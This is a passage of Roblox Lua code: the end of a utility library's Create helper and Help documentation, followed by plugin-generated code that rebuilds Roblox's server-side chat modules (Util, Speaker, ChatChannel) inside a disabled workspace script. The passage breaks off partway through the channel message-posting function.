			--return the proxy function that gives us the nice Create'string'{data} syntax
			--The first function call is a function call using Lua's single-string-argument syntax
			--The second function call is using Lua's single-table-argument syntax
			--Both can be chained together for the nice effect.
			return function(dat)
				--default to nothing, to handle the no argument given case
				dat = dat or {}
		
				--make the object to mutate
				local obj = Instance.new(objectType)
				local parent = nil
		
				--stored constructor function to be called after other initialization
				local ctor = nil
		
				for k, v in pairs(dat) do
					--add property
					if type(k) == 'string' then
						if k == 'Parent' then
							-- Parent should always be set last, setting the Parent of a new object
							-- immediately makes performance worse for all subsequent property updates.
							parent = v
						else
							obj[k] = v
						end
		
		
					--add child
					elseif type(k) == 'number' then
						if type(v) ~= 'userdata' then
							error("Bad entry in Create body: Numeric keys must be paired with children, got a: "..type(v), 2)
						end
						v.Parent = obj
		
		
					--event connect
					elseif type(k) == 'table' and k.__eventname then
						if type(v) ~= 'function' then
							error("Bad entry in Create body: Key `[Create.E\'"..k.__eventname.."\']` must have a function value\
							       got: "..tostring(v), 2)
						end
						obj[k.__eventname]:connect(v)
		
		
					--define constructor function
					elseif k == t.Create then
						if type(v) ~= 'function' then
							error("Bad entry in Create body: Key `[Create]` should be paired with a constructor function, \
							       got: "..tostring(v), 2)
						elseif ctor then
							--ctor already exists, only one allowed
							error("Bad entry in Create body: Only one constructor function is allowed", 2)
						end
						ctor = v
		
		
					else
						error("Bad entry ("..tostring(k).." => "..tostring(v)..") in Create body", 2)
					end
				end
		
				--apply constructor function if it exists
				if ctor then
					ctor(obj)
				end
				
				if parent then
					obj.Parent = parent
				end
		
				--return the completed object
				return obj
			end
		end
		
		--now, create the functor:
		t.Create = setmetatable({}, {__call = function(tb, ...) return Create_PrivImpl(...) end})
		
		--and create the "Event.E" syntax stub. Really it's just a stub to construct a table which our Create
		--function can recognize as special.
		t.Create.E = function(eventName)
			return {__eventname = eventName}
		end
		
		-------------------------------------------------Create function End----------------------------------------------------
		
		
		
		
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------Documentation Begin-----------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		------------------------------------------------------------------------------------------------------------------------
		
		t.Help = 
			function(funcNameOrFunc) 
				--input argument can be a string or a function.  Should return a description (of arguments and expected side effects)
				if funcNameOrFunc == "DecodeJSON" or funcNameOrFunc == t.DecodeJSON then
					return "Function DecodeJSON.  " ..
					       "Arguments: (string).  " .. 
					       "Side effect: returns a table with all parsed JSON values" 
				end
				if funcNameOrFunc == "EncodeJSON" or funcNameOrFunc == t.EncodeJSON then
					return "Function EncodeJSON.  " ..
					       "Arguments: (table).  " .. 
					       "Side effect: returns a string composed of argument table in JSON data format" 
				end  
				if funcNameOrFunc == "MakeWedge" or funcNameOrFunc == t.MakeWedge then
					return "Function MakeWedge. " ..
					       "Arguments: (x, y, z, [default material]). " ..
					       "Description: Makes a wedge at location x, y, z. Sets cell x, y, z to default material if "..
					       "parameter is provided, if not sets cell x, y, z to be whatever material it previously was. "..
					       "Returns true if made a wedge, false if the cell remains a block "
				end
				if funcNameOrFunc == "SelectTerrainRegion" or funcNameOrFunc == t.SelectTerrainRegion then
					return "Function SelectTerrainRegion. " ..
					       "Arguments: (regionToSelect, color, selectEmptyCells, selectionParent). " ..
					       "Description: Selects all terrain via a series of selection boxes within the regionToSelect " ..
					       "(this should be a region3 value). The selection box color is detemined by the color argument " ..
					       "(should be a brickcolor value). SelectionParent is the parent that the selection model gets placed to (optional)." ..
					       "SelectEmptyCells is bool, when true will select all cells in the " ..
					       "region, otherwise we only select non-empty cells. Returns a function that can update the selection," ..
					       "arguments to said function are a new region3 to select, and the adornment color (color arg is optional). " ..
					       "Also returns a second function that takes no arguments and destroys the selection"
				end
				if funcNameOrFunc == "CreateSignal" or funcNameOrFunc == t.CreateSignal then
					return "Function CreateSignal. "..
					       "Arguments: None. "..
					       "Returns: The newly created Signal object. This object is identical to the RBXScriptSignal class "..
					       "used for events in Objects, but is a Lua-side object so it can be used to create custom events in"..
					       "Lua code. "..
					       "Methods of the Signal object: :connect, :wait, :fire, :disconnect. "..
					       "For more info you can pass the method name to the Help function, or view the wiki page "..
					       "for this library. EG: Help('Signal:connect')."
				end
				if funcNameOrFunc == "Signal:connect" then
					return "Method Signal:connect. "..
					       "Arguments: (function handler). "..
					       "Return: A connection object which can be used to disconnect the connection to this handler. "..
					       "Description: Connectes a handler function to this Signal, so that when |fire| is called the "..
					       "handler function will be called with the arguments passed to |fire|."
				end
				if funcNameOrFunc == "Signal:wait" then
					return "Method Signal:wait. "..
					       "Arguments: None. "..
					       "Returns: The arguments passed to the next call to |fire|. "..
					       "Description: This call does not return until the next call to |fire| is made, at which point it "..
					       "will return the values which were passed as arguments to that |fire| call."
				end
				if funcNameOrFunc == "Signal:fire" then
					return "Method Signal:fire. "..
					       "Arguments: Any number of arguments of any type. "..
					       "Returns: None. "..
					       "Description: This call will invoke any connected handler functions, and notify any waiting code "..
					       "attached to this Signal to continue, with the arguments passed to this function. Note: The calls "..
					       "to handlers are made asynchronously, so this call will return immediately regardless of how long "..
					       "it takes the connected handler functions to complete."
				end
				if funcNameOrFunc == "Signal:disconnect" then
					return "Method Signal:disconnect. "..
					       "Arguments: None. "..
					       "Returns: None. "..
					       "Description: This call disconnects all handlers attacched to this function, note however, it "..
					       "does NOT make waiting code continue, as is the behavior of normal Roblox events. This method "..
					       "can also be called on the connection object which is returned from Signal:connect to only "..
					       "disconnect a single handler, as opposed to this method, which will disconnect all handlers."
				end
				if funcNameOrFunc == "Create" then
					return "Function Create. "..
					       "Arguments: A table containing information about how to construct a collection of objects. "..
					       "Returns: The constructed objects. "..
					       "Descrition: Create is a very powerfull function, whose description is too long to fit here, and "..
					       "is best described via example, please see the wiki page for a description of how to use it."
				end
			end
			
		--------------------------------------------Documentation Ends----------------------------------------------------------
		
		return t
		
	end
}

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local cqrwfrafaw = Instance.new("Script")
cqrwfrafaw.Disabled = true
cqrwfrafaw.Name = "cqrwfrafaw"
cqrwfrafaw.Parent = workspace

local util = Instance.new("ModuleScript")
util.Name = "Util"
util.Parent = cqrwfrafaw

local speaker = Instance.new("ModuleScript")
speaker.Name = "Speaker"
speaker.Parent = cqrwfrafaw

local chatchannel = Instance.new("ModuleScript")
chatchannel.Name = "ChatChannel"
chatchannel.Parent = cqrwfrafaw

local chat_service = Instance.new("ModuleScript")
chat_service.Name = "ChatService"
chat_service.Parent = cqrwfrafaw

--// Modules

local modules = {
	[util] = function()
		--	// FileName: Util.lua
		--	// Written by: TheGamer101
		--	// Description: Utility code used by the server side chat implementation.
		
		local Chat = game:GetService("Chat")
		local ReplicatedModules = Chat:WaitForChild("ClientChatModules")
		local ChatConstants = require(ReplicatedModules:WaitForChild("ChatConstants"))
		
		local DEFAULT_PRIORITY = ChatConstants.StandardPriority
		if DEFAULT_PRIORITY == nil then
			DEFAULT_PRIORITY = 10
		end
		
		local Util = {}
		Util.__index = Util
		
		local SortedFunctionContainer = {}; do
			-- This sorted function container is used to handle the logic around storing filter functions and
			-- command processors by priority.
		
			local methods = {}
			methods.__index = methods
		
			function methods:RebuildProcessCommandsPriorities()
				self.RegisteredPriorites = {}
				for priority, functions in pairs(self.FunctionMap) do
					local functionsEmpty = true
					for funcId, funciton in pairs(functions) do
						functionsEmpty = false
						break
					end
					if not functionsEmpty then
						table.insert(self.RegisteredPriorites, priority)
					end
				end
				table.sort(self.RegisteredPriorites, function(a, b)
					return a > b
				end)
			end
		
			function methods:HasFunction(funcId)
				if self.RegisteredFunctions[funcId] == nil then
					return false
				end
				return true
			end
		
			function methods:RemoveFunction(funcId)
				local functionPriority = self.RegisteredFunctions[funcId]
				self.RegisteredFunctions[funcId] = nil
				self.FunctionMap[functionPriority][funcId] = nil
				self:RebuildProcessCommandsPriorities()
			end
		
			function methods:AddFunction(funcId, func, priority)
				if priority == nil then
					priority = DEFAULT_PRIORITY
				end
		
				if self.RegisteredFunctions[funcId] then
					error(funcId .. " is already in use!")
				end
		
				self.RegisteredFunctions[funcId] = priority
		
				if self.FunctionMap[priority] == nil then
					self.FunctionMap[priority] = {}
				end
		
				self.FunctionMap[priority][funcId] = func
				self:RebuildProcessCommandsPriorities()
			end
		
			function methods:GetIterator()
				local priorityIndex = 1
				local funcId = nil
				local func = nil
		
				return function()
					while true do
						if priorityIndex > #self.RegisteredPriorites then
							return
						end
						local priority = self.RegisteredPriorites[priorityIndex]
						funcId, func = next(self.FunctionMap[priority], funcId)
						if funcId == nil then
							priorityIndex = priorityIndex + 1
						else
							return funcId, func, priority
						end
					end
				end
			end
		
			function SortedFunctionContainer.new()
				local obj = setmetatable({}, methods)
		
				obj.RegisteredFunctions = {}
				obj.RegisteredPriorites = {}
				obj.FunctionMap = {}
		
				return obj
			end
		end
		
		function Util:NewSortedFunctionContainer()
			return SortedFunctionContainer.new()
		end
		
		return Util
		
	end[speaker] = function()
		--	// FileName: Speaker.lua
		--	// Written by: Xsitsu
		--	// Description: A representation of one entity that can chat in different ChatChannels.
		
		local module = {}
		
		local RunService = game:GetService("RunService")
		local Chat = game:GetService("Chat")
		local ReplicatedModules = Chat:WaitForChild("ClientChatModules")
		local ChatSettings = require(ReplicatedModules:WaitForChild("ChatSettings"))
		
		local modulesFolder = script.Parent
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local function ShallowCopy(table)
			local copy = {}
			for i, v in pairs(table) do
				copy[i] = v
			end
			return copy
		end
		
		local methods = {}
		
		local lazyEventNames =
		{
		    eDestroyed = true,
			eSaidMessage = true,
			eReceivedMessage = true,
			eReceivedUnfilteredMessage = true,
			eMessageDoneFiltering = true,
			eReceivedSystemMessage = true,
			eChannelJoined = true,
			eChannelLeft = true,
			eMuted = true,
			eUnmuted = true,
			eExtraDataUpdated = true,
			eMainChannelSet = true,
			eChannelNameColorUpdated = true,
		}
		local lazySignalNames =
		{
			Destroyed = "eDestroyed",
			SaidMessage = "eSaidMessage",
			ReceivedMessage = "eReceivedMessage",
			ReceivedUnfilteredMessage = "eReceivedUnfilteredMessage",
		    RecievedUnfilteredMessage = "eReceivedUnfilteredMessage", -- legacy mispelling
			MessageDoneFiltering = "eMessageDoneFiltering",
			ReceivedSystemMessage = "eReceivedSystemMessage",
			ChannelJoined = "eChannelJoined",
			ChannelLeft = "eChannelLeft",
			Muted = "eMuted",
			Unmuted = "eUnmuted",
			ExtraDataUpdated = "eExtraDataUpdated",
			MainChannelSet = "eMainChannelSet",
			ChannelNameColorUpdated = "eChannelNameColorUpdated"
		}
		
		methods.__index = function (self, k)
			local fromMethods = rawget(methods, k)
			if fromMethods then return fromMethods end
		
		    if lazyEventNames[k] and not rawget(self, k) then
		        rawset(self, k, Instance.new("BindableEvent"))
		    end
		    local lazySignalEventName = lazySignalNames[k]
		    if lazySignalEventName and not rawget(self, k) then
		        if not rawget(self, lazySignalEventName) then
		            rawset(self, lazySignalEventName, Instance.new("BindableEvent"))
		        end
		        rawset(self, k, rawget(self, lazySignalEventName).Event)
		    end
		    return rawget(self, k)
		end
		
		function methods:LazyFire(eventName, ...)
			local createdEvent = rawget(self, eventName)
			if createdEvent then
				createdEvent:Fire(...)
			end
		end
		
		function methods:SayMessage(message, channelName, extraData)
			if self.ChatService:InternalDoProcessCommands(self.Name, message, channelName) then
				return
			end
			if not channelName then
				return
			end
		
			local channel = self.Channels[channelName:lower()]
			if not channel then
				return
			end
		
			local messageObj = channel:InternalPostMessage(self, message, extraData)
			if messageObj then
				pcall(function()
					self:LazyFire("eSaidMessage", messageObj, channelName)
				end)
			end
		
			return messageObj
		end
		
		function methods:JoinChannel(channelName)
			if (self.Channels[channelName:lower()]) then
				warn("Speaker is already in channel \"" .. channelName .. "\"")
				return
			end
		
			local channel = self.ChatService:GetChannel(channelName)
			if (not channel) then
				error("Channel \"" .. channelName .. "\" does not exist!")
			end
		
			self.Channels[channelName:lower()] = channel
			channel:InternalAddSpeaker(self)
			local success, err = pcall(function()
				self.eChannelJoined:Fire(channel.Name, channel:GetWelcomeMessageForSpeaker(self))
			end)
			if not success and err then
				print("Error joining channel: " ..err)
			end
		end
		
		function methods:LeaveChannel(channelName)
			if (not self.Channels[channelName:lower()]) then
				warn("Speaker is not in channel \"" .. channelName .. "\"")
				return
			end
		
			local channel = self.Channels[channelName:lower()]
		
			self.Channels[channelName:lower()] = nil
			channel:InternalRemoveSpeaker(self)
			local success, err = pcall(function()
				self:LazyFire("eChannelLeft", channel.Name)
				if self.PlayerObj then
					self.EventFolder.OnChannelLeft:FireClient(self.PlayerObj, channel.Name)
				end
			end)
			if not success and err then
				print("Error leaving channel: " ..err)
			end
		end
		
		function methods:IsInChannel(channelName)
			return (self.Channels[channelName:lower()] ~= nil)
		end
		
		function methods:GetChannelList()
			local list = {}
			for i, channel in pairs(self.Channels) do
				table.insert(list, channel.Name)
			end
			return list
		end
		
		function methods:SendMessage(message, channelName, fromSpeaker, extraData)
			local channel = self.Channels[channelName:lower()]
			if (channel) then
				channel:SendMessageToSpeaker(message, self.Name, fromSpeaker, extraData)
		
			elseif RunService:IsStudio() then
				warn(string.format("Speaker '%s' is not in channel '%s' and cannot receive a message in it.", self.Name, channelName))
		
			end
		end
		
		function methods:SendSystemMessage(message, channelName, extraData)
			local channel = self.Channels[channelName:lower()]
			if (channel) then
				channel:SendSystemMessageToSpeaker(message, self.Name, extraData)
		
			elseif RunService:IsStudio() then
				warn(string.format("Speaker '%s' is not in channel '%s' and cannot receive a system message in it.", self.Name, channelName))
		
			end
		end
		
		function methods:GetPlayer()
			return self.PlayerObj
		end
		
		function methods:GetNameForDisplay()
			if ChatSettings.PlayerDisplayNamesEnabled then
				local player = self:GetPlayer()
		
				if player then
					return player.DisplayName
				else
					return self.Name
				end
			else
				return self.Name
			end
		end
		
		function methods:SetExtraData(key, value)
			self.ExtraData[key] = value
			self:LazyFire("eExtraDataUpdated", key, value)
		end
		
		function methods:GetExtraData(key)
			return self.ExtraData[key]
		end
		
		function methods:SetMainChannel(channelName)
			local success, err = pcall(function()
				self:LazyFire("eMainChannelSet", channelName)
				if self.PlayerObj then
					self.EventFolder.OnMainChannelSet:FireClient(self.PlayerObj, channelName)
				end
			end)
			if not success and err then
				print("Error setting main channel: " ..err)
			end
		end
		
		--- Used to mute a speaker so that this speaker does not see their messages.
		function methods:AddMutedSpeaker(speakerName)
			self.MutedSpeakers[speakerName:lower()] = true
		end
		
		function methods:RemoveMutedSpeaker(speakerName)
			self.MutedSpeakers[speakerName:lower()] = false
		end
		
		function methods:IsSpeakerMuted(speakerName)
			return self.MutedSpeakers[speakerName:lower()]
		end
		
		--///////////////// Internal-Use Methods
		--//////////////////////////////////////
		function methods:InternalDestroy()
			for i, channel in pairs(self.Channels) do
				channel:InternalRemoveSpeaker(self)
			end
		
			self.eDestroyed:Fire()
		
			self.EventFolder = nil
			self.eDestroyed:Destroy()
			self.eSaidMessage:Destroy()
			self.eReceivedMessage:Destroy()
			self.eReceivedUnfilteredMessage:Destroy()
			self.eMessageDoneFiltering:Destroy()
			self.eReceivedSystemMessage:Destroy()
			self.eChannelJoined:Destroy()
			self.eChannelLeft:Destroy()
			self.eMuted:Destroy()
			self.eUnmuted:Destroy()
			self.eExtraDataUpdated:Destroy()
			self.eMainChannelSet:Destroy()
			self.eChannelNameColorUpdated:Destroy()
		end
		
		function methods:InternalAssignPlayerObject(playerObj)
			self.PlayerObj = playerObj
		end
		
		function methods:InternalAssignEventFolder(eventFolder)
			self.EventFolder = eventFolder
		end
		
		function methods:InternalSendMessage(messageObj, channelName)
			local success, err = pcall(function()
				self:LazyFire("eReceivedUnfilteredMessage", messageObj, channelName)
				if self.PlayerObj then
					self.EventFolder.OnNewMessage:FireClient(self.PlayerObj, messageObj, channelName)
				end
			end)
			if not success and err then
				print("Error sending internal message: " ..err)
			end
		end
		
		function methods:InternalSendFilteredMessage(messageObj, channelName)
			local success, err = pcall(function()
				self:LazyFire("eReceivedMessage", messageObj, channelName)
				self:LazyFire("eMessageDoneFiltering", messageObj, channelName)
				if self.PlayerObj then
					self.EventFolder.OnMessageDoneFiltering:FireClient(self.PlayerObj, messageObj, channelName)
				end
			end)
			if not success and err then
				print("Error sending internal filtered message: " ..err)
			end
		end
		
		--// This method is to be used with the new filter API. This method takes the
		--// TextFilterResult objects and converts them into the appropriate string
		--// messages for each player.
		function methods:InternalSendFilteredMessageWithFilterResult(inMessageObj, channelName)
			local messageObj = ShallowCopy(inMessageObj)
		
			local oldFilterResult = messageObj.FilterResult
			local player = self:GetPlayer()
		
			local msg = ""
			pcall(function()
				if (messageObj.IsFilterResult) then
					if (player) then
						msg = oldFilterResult:GetChatForUserAsync(player.UserId)
					else
						msg = oldFilterResult:GetNonChatStringForBroadcastAsync()
					end
				else
					msg = oldFilterResult
				end
			end)
		
			--// Messages of 0 length are the result of two users not being allowed
			--// to chat, or GetChatForUserAsync() failing. In both of these situations,
			--// messages with length of 0 should not be sent.
			if (#msg > 0) then
				messageObj.Message = msg
				messageObj.FilterResult = nil
				self:InternalSendFilteredMessage(messageObj, channelName)
			end
		end
		
		function methods:InternalSendSystemMessage(messageObj, channelName)
			local success, err = pcall(function()
				self:LazyFire("eReceivedSystemMessage", messageObj, channelName)
				if self.PlayerObj then
					self.EventFolder.OnNewSystemMessage:FireClient(self.PlayerObj, messageObj, channelName)
				end
			end)
			if not success and err then
				print("Error sending internal system message: " ..err)
			end
		end
		
		function methods:UpdateChannelNameColor(channelName, channelNameColor)
			self:LazyFire("eChannelNameColorUpdated", channelName, channelNameColor)
			if self.PlayerObj then
				self.EventFolder.ChannelNameColorUpdated:FireClient(self.PlayerObj, channelName, channelNameColor)
			end
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new(vChatService, name)
			local obj = setmetatable({}, methods)
		
			obj.ChatService = vChatService
		
			obj.PlayerObj = nil
		
			obj.Name = name
			obj.ExtraData = {}
		
			obj.Channels = {}
			obj.MutedSpeakers = {}
			obj.EventFolder = nil
		
			return obj
		end
		
		return module
		
	end[chatchannel] = function()
		--	// FileName: ChatChannel.lua
		--	// Written by: Xsitsu
		--	// Description: A representation of one channel that speakers can chat in.
		
		local userShouldMuteUnfilteredMessage = false
		do
			local success, enabled = pcall(function() return UserSettings():IsUserFeatureEnabled("UserShouldMuteUnfilteredMessage") end)
			userShouldMuteUnfilteredMessage = success and enabled
		end
		
		local module = {}
		
		local modulesFolder = script.Parent
		local Chat = game:GetService("Chat")
		local RunService = game:GetService("RunService")
		local replicatedModules = Chat:WaitForChild("ClientChatModules")
		local ChatSettings = require(replicatedModules:WaitForChild("ChatSettings"))
		
		--////////////////////////////// Include
		--//////////////////////////////////////
		local ChatConstants = require(replicatedModules:WaitForChild("ChatConstants"))
		local Util = require(modulesFolder:WaitForChild("Util"))
		
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		ChatLocalization = ChatLocalization or {}
		
		if not ChatLocalization.FormatMessageToSend or not ChatLocalization.LocalizeFormattedMessage then
			function ChatLocalization:FormatMessageToSend(key,default) return default end
		end
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		
		local methods = {}
		methods.__index = methods
		
		function methods:SendSystemMessage(message, extraData)
			local messageObj = self:InternalCreateMessageObject(message, nil, true, extraData)
		
			local success, err = pcall(function() self.eMessagePosted:Fire(messageObj) end)
			if not success and err then
				print("Error posting message: " ..err)
			end
		
			self:InternalAddMessageToHistoryLog(messageObj)
		
			for i, speaker in pairs(self.Speakers) do
				speaker:InternalSendSystemMessage(messageObj, self.Name)
			end
		
			return messageObj
		end
		
		function methods:SendSystemMessageToSpeaker(message, speakerName, extraData)
			local speaker = self.Speakers[speakerName]
			if (speaker) then
				local messageObj = self:InternalCreateMessageObject(message, nil, true, extraData)
				speaker:InternalSendSystemMessage(messageObj, self.Name)
			elseif RunService:IsStudio() then
				warn(string.format("Speaker '%s' is not in channel '%s' and cannot be sent a system message", speakerName, self.Name))
			end
		end
		
		function methods:SendMessageObjToFilters(message, messageObj, fromSpeaker)
			local oldMessage = messageObj.Message
			messageObj.Message = message
			self:InternalDoMessageFilter(fromSpeaker.Name, messageObj, self.Name)
			self.ChatService:InternalDoMessageFilter(fromSpeaker.Name, messageObj, self.Name)
			local newMessage = messageObj.Message
			messageObj.Message = oldMessage
			return newMessage
		end
		
		function methods:CanCommunicateByUserId(userId1, userId2)
			if RunService:IsStudio() then
				return true
			end
			-- UserId is set as 0 for non player speakers.
			if userId1 == 0 or userId2 == 0 then
				return true
			end
			local success, canCommunicate = pcall(function()
				return Chat:CanUsersChatAsync(userId1, userId2)
			end)
			return success and canCommunicate
		end
		
		function methods:CanCommunicate(speakerObj1, speakerObj2)
			local player1 = speakerObj1:GetPlayer()
			local player2 = speakerObj2:GetPlayer()
			if player1 and player2 then
				return self:CanCommunicateByUserId(player1.UserId, player2.UserId)
			end
			return true
		end
		
		function methods:SendMessageToSpeaker(message, speakerName, fromSpeakerName, extraData)
			local speakerTo = self.Speakers[speakerName]
			local speakerFrom = self.ChatService:GetSpeaker(fromSpeakerName)
			if speakerTo and speakerFrom then
				local isMuted = speakerTo:IsSpeakerMuted(fromSpeakerName)
				if isMuted then
					return
				end
		
				if not self:CanCommunicate(speakerTo, speakerFrom) then
					return
				end
		
				-- We need to claim the message is filtered even if it not in this case for compatibility with legacy client side code.
				local isFiltered = speakerName == fromSpeakerName
				local messageObj = self:InternalCreateMessageObject(message, fromSpeakerName, isFiltered, extraData)
				message = self:SendMessageObjToFilters(message, messageObj, fromSpeakerName)
				speakerTo:InternalSendMessage(messageObj, self.Name)
		
				local textContext = self.Private and Enum.TextFilterContext.PrivateChat or Enum.TextFilterContext.PublicChat
				local filterSuccess, isFilterResult, filteredMessage = self.ChatService:InternalApplyRobloxFilterNewAPI(
					messageObj.FromSpeaker,
					message,
					textContext
				)
				if (filterSuccess) then
					messageObj.FilterResult = filteredMessage
					messageObj.IsFilterResult = isFilterResult
					messageObj.IsFiltered = true
					speakerTo:InternalSendFilteredMessageWithFilterResult(messageObj, self.Name)
				end
			elseif RunService:IsStudio() then
				warn(string.format("Speaker '%s' is not in channel '%s' and cannot be sent a message", speakerName, self.Name))
			end
		end
		
		function methods:KickSpeaker(speakerName, reason)
			local speaker = self.ChatService:GetSpeaker(speakerName)
			if (not speaker) then
				error("Speaker \"" .. speakerName .. "\" does not exist!")
			end
		
			local messageToSpeaker = ""
			local messageToChannel = ""
			local playerName = speaker:GetNameForDisplay()
		
			if (reason) then
				messageToSpeaker = string.format("You were kicked from '%s' for the following reason(s): %s", self.Name, reason)
				messageToChannel = string.format("%s was kicked for the following reason(s): %s", playerName, reason)
			else
				messageToSpeaker = string.format("You were kicked from '%s'", self.Name)
				messageToChannel = string.format("%s was kicked", playerName)
			end
		
			self:SendSystemMessageToSpeaker(messageToSpeaker, speakerName)
			speaker:LeaveChannel(self.Name)
			self:SendSystemMessage(messageToChannel)
		end
		
		function methods:MuteSpeaker(speakerName, reason, length)
			local speaker = self.ChatService:GetSpeaker(speakerName)
			if (not speaker) then
				error("Speaker \"" .. speakerName .. "\" does not exist!")
			end
		
			self.Mutes[speakerName:lower()] = (length == 0 or length == nil) and 0 or (os.time() + length)
		
			if (reason) then
				local playerName = speaker:GetNameForDisplay()
		
				self:SendSystemMessage(string.format("%s was muted for the following reason(s): %s", playerName, reason))
			end
		
			local success, err = pcall(function() self.eSpeakerMuted:Fire(speakerName, reason, length) end)
			if not success and err then
				print("Error mutting speaker: " ..err)
			end
		
			local spkr = self.ChatService:GetSpeaker(speakerName)
			if (spkr) then
				local success, err = pcall(function() spkr.eMuted:Fire(self.Name, reason, length) end)
				if not success and err then
					print("Error mutting speaker: " ..err)
				end
			end
		
		end
		
		function methods:UnmuteSpeaker(speakerName)
			local speaker = self.ChatService:GetSpeaker(speakerName)
			if (not speaker) then
				error("Speaker \"" .. speakerName .. "\" does not exist!")
			end
		
			self.Mutes[speakerName:lower()] = nil
		
			local success, err = pcall(function() self.eSpeakerUnmuted:Fire(speakerName) end)
			if not success and err then
				print("Error unmuting speaker: " ..err)
			end
		
			local spkr = self.ChatService:GetSpeaker(speakerName)
			if (spkr) then
				local success, err = pcall(function() spkr.eUnmuted:Fire(self.Name) end)
				if not success and err then
					print("Error unmuting speaker: " ..err)
				end
			end
		end
		
		function methods:IsSpeakerMuted(speakerName)
			return (self.Mutes[speakerName:lower()] ~= nil)
		end
		
		function methods:GetSpeakerList()
			local list = {}
			for i, speaker in pairs(self.Speakers) do
				table.insert(list, speaker.Name)
			end
			return list
		end
		
		function methods:RegisterFilterMessageFunction(funcId, func, priority)
			if self.FilterMessageFunctions:HasFunction(funcId) then
				error(string.format("FilterMessageFunction '%s' already exists", funcId))
			end
			self.FilterMessageFunctions:AddFunction(funcId, func, priority)
		end
		
		function methods:FilterMessageFunctionExists(funcId)
			return self.FilterMessageFunctions:HasFunction(funcId)
		end
		
		function methods:UnregisterFilterMessageFunction(funcId)
			if not self.FilterMessageFunctions:HasFunction(funcId) then
				error(string.format("FilterMessageFunction '%s' does not exists", funcId))
			end
			self.FilterMessageFunctions:RemoveFunction(funcId)
		end
		
		function methods:RegisterProcessCommandsFunction(funcId, func, priority)
			if self.ProcessCommandsFunctions:HasFunction(funcId) then
				error(string.format("ProcessCommandsFunction '%s' already exists", funcId))
			end
			self.ProcessCommandsFunctions:AddFunction(funcId, func, priority)
		end
		
		function methods:ProcessCommandsFunctionExists(funcId)
			return self.ProcessCommandsFunctions:HasFunction(funcId)
		end
		
		function methods:UnregisterProcessCommandsFunction(funcId)
			if not self.ProcessCommandsFunctions:HasFunction(funcId) then
				error(string.format("ProcessCommandsFunction '%s' does not exist", funcId))
			end
			self.ProcessCommandsFunctions:RemoveFunction(funcId)
		end
		
		local function ShallowCopy(table)
			local copy = {}
			for i, v in pairs(table) do
				copy[i] = v
			end
			return copy
		end
		
		function methods:GetHistoryLog()
			return ShallowCopy(self.ChatHistory)
		end
		
		function methods:GetHistoryLogForSpeaker(speaker)
			local userId = -1
			local player = speaker:GetPlayer()
			if player then
				userId = player.UserId
			end
			local chatlog = {}
		
			for i = 1, #self.ChatHistory do
				local logUserId = self.ChatHistory[i].SpeakerUserId
				if self:CanCommunicateByUserId(userId, logUserId) then
					local messageObj = ShallowCopy(self.ChatHistory[i])
		
					--// Since we're using the new filter API, we need to convert the stored filter result
					--// into an actual string message to send to players for their chat history.
					--// System messages aren't filtered the same way, so they just have a regular
					--// text value in the Message field.
					if (messageObj.MessageType == ChatConstants.MessageTypeDefault or messageObj.MessageType == ChatConstants.MessageTypeMeCommand) then
						local filterResult = messageObj.FilterResult
						if (messageObj.IsFilterResult) then
							if (player) then
								messageObj.Message = filterResult:GetChatForUserAsync(player.UserId)
							else
								messageObj.Message = filterResult:GetNonChatStringForBroadcastAsync()
							end
						else
							messageObj.Message = filterResult
						end
					end
		
					table.insert(chatlog, messageObj)
				end
			end
			return chatlog
		end
		
		--///////////////// Internal-Use Methods
		--//////////////////////////////////////
		function methods:InternalDestroy()
			for i, speaker in pairs(self.Speakers) do
				speaker:LeaveChannel(self.Name)
			end
		
			self.eDestroyed:Fire()
		
			self.eDestroyed:Destroy()
			self.eMessagePosted:Destroy()
			self.eSpeakerJoined:Destroy()
			self.eSpeakerLeft:Destroy()
			self.eSpeakerMuted:Destroy()
			self.eSpeakerUnmuted:Destroy()
		end
		
		function methods:InternalDoMessageFilter(speakerName, messageObj, channel)
			local filtersIterator = self.FilterMessageFunctions:GetIterator()
			for funcId, func, priority in filtersIterator do
				local success, errorMessage = pcall(function()
					func(speakerName, messageObj, channel)
				end)
		
				if not success then
					warn(string.format("DoMessageFilter Function '%s' failed for reason: %s", funcId, errorMessage))
				end
			end
		end
		
		function methods:InternalDoProcessCommands(speakerName, message, channel)
			local commandsIterator = self.ProcessCommandsFunctions:GetIterator()
			for funcId, func, priority in commandsIterator do
				local success, returnValue = pcall(function()
					local ret = func(speakerName, message, channel)
					if type(ret) ~= "boolean" then
						error("Process command functions must return a bool")
					end
					return ret
				end)
		
				if not success then
					warn(string.format("DoProcessCommands Function '%s' failed for reason: %s", funcId, returnValue))
				elseif returnValue then
					return true
				end
			end
		
			return false
		end
		
		function methods:InternalPostMessage(fromSpeaker, message, extraData)
			if (self:InternalDoProcessCommands(fromSpeaker.Name, message, self.Name)) then return false end
		
			if (self.Mutes[fromSpeaker.Name:lower()] ~= nil) then
				local t = self.Mutes[fromSpeaker.Name:lower()]
				if (t > 0 and os.time() > t) then
					self:UnmuteSpeaker(fromSpeaker.Name)
				else
					self:SendSystemMessageToSpeaker(ChatLocalization:FormatMessageToSend("GameChat_ChatChannel_MutedInChannel","You are muted and cannot talk in this channel"), fromSpeaker.Name)
					return false
				end
			end
		
			local messageObj = self:InternalCreateMessageObject(message, fromSpeaker.Name, false, extraData)
		
			-- allow server to process the unfiltered message string
			messageObj.Message = message
			local processedMessage
			pcall(function()
				processedMessage = Chat:InvokeChatCallback(Enum.ChatCallbackType.OnServerReceivingMessage, messageObj)
			end)
			messageObj.Message = nil
		
			if processedMessage then
		
				-- developer server code's choice to mute the message
				if processedMessage.ShouldDeliver == false then
					return false
				end
				messageObj = processedMessage
			end
		
			message = self:SendMessageObjToFilters(message, messageObj, fromSpeaker)
		
			local sentToList = {}
			for i, speaker in pairs(self.Speakers) do
				local isMuted = speaker:IsSpeakerMuted(fromSpeaker.Name)
				if not isMuted and self:CanCommunicate(fromSpeaker, speaker) then
					table.insert(sentToList, speaker.Name)
